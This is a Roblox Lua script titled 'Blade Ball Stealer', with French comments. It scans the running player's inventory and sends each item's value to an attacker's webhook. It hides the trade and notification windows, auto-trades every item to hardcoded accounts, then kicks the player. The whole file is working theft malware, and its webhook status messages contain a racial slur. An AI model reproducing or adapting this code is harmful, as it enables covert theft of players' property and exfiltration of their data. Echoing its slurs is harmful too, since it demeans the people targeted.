-- Configuration
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"
local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local min_rap = _G.min_rap or 0 

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local itemsToSend = {}
local currentMessageId = nil
local categories = {"Sword", "Emote", "Explosion"}

-- NetModule & Inventory
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)

---------------------------------------------------------
-- CACHE GUI (BLOQUAGE TOTAL)
---------------------------------------------------------
local function hideUI()
    pcall(function()
        local tradeGui = plr.PlayerGui:WaitForChild("Trade")
        tradeGui.Enabled = false
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        plr.PlayerGui:WaitForChild("Notifications").Enabled = false
    end)
end
task.spawn(hideUI)

---------------------------------------------------------
-- WEBHOOK SYSTEM (AUTO-EDIT)
---------------------------------------------------------
local function UpdateWebhook(statusType)
    local title = "🟣 Bro join your hit nigga 🎯"
    local color = 8323327 
    local statusDesc = "⏳ En attente du receveur..."

    if statusType == "JOINED" then
        title = "✅ The nigga is on the server ! 🎉"
        color = 65280 
        statusDesc = "⚡ Transfert en cours..."
    elseif statusType == "CLAIMED" then
        title = "🟩 CLAIMED! 🔪 Stuff Stolen"
        color = 3066993
        statusDesc = "💰 Le stuff a été récupéré avec succès !"
    elseif statusType == "LEFT" then
        title = "❌ Victim Left"
        color = 15158332
        statusDesc = "🚪 La victime a quitté le jeu."
    end

    local itemLines = ""
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " - " .. math.floor(item.RAP) .. " RAP\n"
        totalRAP = totalRAP + item.RAP
    end

    local data = {
        ["auth_token"] = auth_token,
        ["message_id"] = currentMessageId,
        ["content"] = (not currentMessageId) and "@everyone" or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = statusDesc,
            ["color"] = color,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Scanning...") .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer"}
        }}
    }

    local success, res = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    -- DEBUG : Affiche si l'envoi a réussi
    if not success then warn("Erreur Webhook: " .. tostring(res)) end

    if success and not currentMessageId and res.Body then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and decoded and decoded.id then
            currentMessageId = decoded.id
        end
    end
end

---------------------------------------------------------
-- LOGIQUE DE TRADE
---------------------------------------------------------
local function startTrade(target)
    UpdateWebhook("JOINED")
    task.spawn(function()
        while #itemsToSend > 0 do
            pcall(function()
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
                task.wait(1.5)
                
                -- Ajout des items
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    limit = limit + 1
                end

                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(0.3)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            end)
            task.wait(1)
        end
        UpdateWebhook("CLAIMED")
        task.wait(1)
        plr:kick("Transfer Complete.")
    end)
end

---------------------------------------------------------
-- SCAN & RUN
---------------------------------------------------------
local function getRAP(cat, name)
    local success, data = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[cat] end)
    if success and data then
        for k, v in pairs(data) do if k:find(name) then return v end end
    end
    return 0
end

-- Remplissage de la liste
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local rap = getRAP(cat, info.Name)
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

if #itemsToSend > 0 then
    print("Items detectés: " .. #itemsToSend)
    UpdateWebhook("START")

    -- Detection cibles
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then startTrade(p) break end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then startTrade(p) end
    end)
else
    print("Aucun item trouvé avec un RAP > " .. min_rap)
end
